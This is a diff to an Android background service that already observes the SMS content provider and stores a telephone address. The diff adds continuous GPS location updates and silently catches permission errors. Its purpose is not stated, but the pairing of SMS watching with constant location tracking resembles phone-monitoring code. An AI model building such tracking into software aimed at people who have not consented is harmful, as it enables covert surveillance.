@@ -6,6 +6,9 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.location.LocationProvider;
 import android.net.Uri;
 import android.os.Handler;
 import android.os.IBinder;
@@ -23,7 +26,7 @@ public class MessagingService extends Service {
     private DatabaseReceiver mDatabaseReceiver;
     private SmsObserver mObserver;
     protected static String sTelephoneAddress;
-
+    private LocationManager mLocationManager;
     public MessagingService() {
     }
 
@@ -71,6 +74,13 @@ public class MessagingService extends Service {
         Log.d(TAG, "address = " + sTelephoneAddress);
         mObserver = new SmsObserver();
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mObserver);
+        String locationProvider = LocationManager.GPS_PROVIDER;
+        try {
+            mLocationManager = Helpers.getLocationManager(this);
+            mLocationManager.requestLocationUpdates(locationProvider, 0, 0, Helpers.getLocationListener(this));
+        } catch (SecurityException e) {
+            e.printStackTrace();
+        }
     }
 
 
